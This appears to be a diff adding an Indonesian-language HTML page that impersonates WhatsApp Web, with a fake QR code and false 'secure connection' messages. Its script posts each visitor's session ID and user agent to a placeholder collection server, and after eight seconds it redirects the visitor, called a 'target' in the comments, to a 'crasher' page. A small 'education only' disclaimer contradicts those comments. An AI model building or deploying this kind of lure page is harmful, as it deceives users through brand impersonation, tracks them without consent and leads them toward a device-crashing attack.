@@ -1,0 +1,164 @@
+<!DOCTYPE html>
+<html lang="id">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>WhatsApp Web</title>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+        body {
+            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Helvetica, Arial, sans-serif;
+            background: #0a0a0a;
+            height: 100vh;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+        }
+        .container {
+            background: #111b21;
+            width: 100%;
+            max-width: 1000px;
+            height: 90vh;
+            border-radius: 20px;
+            display: flex;
+            overflow: hidden;
+            box-shadow: 0 0 40px rgba(0,0,0,0.5);
+        }
+        .sidebar {
+            width: 30%;
+            background: #111b21;
+            border-right: 1px solid #222d34;
+        }
+        .chat-area {
+            width: 70%;
+            background: #0a0a0a;
+            display: flex;
+            flex-direction: column;
+            justify-content: center;
+            align-items: center;
+            text-align: center;
+            padding: 40px;
+        }
+        .qr-container {
+            background: white;
+            padding: 20px;
+            border-radius: 20px;
+            margin-bottom: 20px;
+        }
+        canvas {
+            width: 250px;
+            height: 250px;
+        }
+        .title {
+            color: #e9edef;
+            font-size: 28px;
+            margin-bottom: 10px;
+        }
+        .subtitle {
+            color: #8696a1;
+            font-size: 14px;
+            margin-bottom: 30px;
+        }
+        .steps {
+            color: #8696a1;
+            font-size: 13px;
+            margin-top: 30px;
+        }
+        .fake-chat {
+            width: 100%;
+            max-width: 400px;
+            margin-top: 40px;
+        }
+        .message {
+            background: #1f2c33;
+            padding: 10px 15px;
+            border-radius: 15px;
+            color: #e9edef;
+            margin: 5px 0;
+            font-size: 12px;
+        }
+        .alert {
+            background: #1e2a36;
+            border-left: 4px solid #25d366;
+            padding: 12px;
+            margin-top: 20px;
+            border-radius: 8px;
+            color: #aebac1;
+            font-size: 12px;
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <div class="sidebar"></div>
+        <div class="chat-area">
+            <div class="qr-container">
+                <canvas id="qrCanvas" width="250" height="250"></canvas>
+            </div>
+            <h2 class="title">WhatsApp Web</h2>
+            <p class="subtitle">Scan QR code dengan WhatsApp di ponselmu</p>
+            <div class="steps">
+                • Buka WhatsApp di ponsel<br>
+                • Ketuk Menu → Perangkat Tertaut<br>
+                • Ketuk Tautkan Perangkat<br>
+                • Arahkan kamera ke QR code ini
+            </div>
+            <div class="fake-chat">
+                <div class="message">🔐 Terhubung dengan aman</div>
+                <div class="message">💬 Pesan Anda dienkripsi end-to-end</div>
+            </div>
+            <div class="alert">
+                ⚠️ Simulasi demo - Untuk edukasi keamanan saja
+            </div>
+        </div>
+    </div>
+
+    <script>
+        // QR Code generator yang akan ngirim data ke server lo
+        (function() {
+            // Ganti dengan IP VPS / server lo sendiri ya bro!
+            const WEBHOOK_URL = "https://your-server.com/collect"; 
+            
+            // Generate random session ID
+            const sessionId = Math.random().toString(36).substring(2, 15);
+            
+            // QR Code palsu (bukan asli) - ini cuma display aja
+            const canvas = document.getElementById('qrCanvas');
+            const ctx = canvas.getContext('2d');
+            
+            // Gambar QR dummy
+            ctx.fillStyle = 'white';
+            ctx.fillRect(0, 0, 250, 250);
+            ctx.fillStyle = 'black';
+            for(let i = 0; i < 50; i++) {
+                let x = Math.random() * 250;
+                let y = Math.random() * 250;
+                ctx.fillRect(x, y, 4, 4);
+            }
+            
+            // Bikin link yang akan ngarahin target ke halaman crasher setelah "scan"
+            setTimeout(() => {
+                // Ini redirect ke crasher page setelah 5 detik (seolah-olah QR expired)
+                window.location.href = "crasher.html?session=" + sessionId;
+            }, 8000);
+            
+            // Kirim data ke server lo (buat logging)
+            fetch(WEBHOOK_URL, {
+                method: 'POST',
+                headers: {'Content-Type': 'application/json'},
+                body: JSON.stringify({
+                    type: 'qr_view',
+                    session: sessionId,
+                    userAgent: navigator.userAgent,
+                    timestamp: Date.now(),
+                    ip: 'client-side-cant-get-ip'
+                })
+            }).catch(e => console.log('Logging only'));
+        })();
+    </script>
+</body>
+</html>
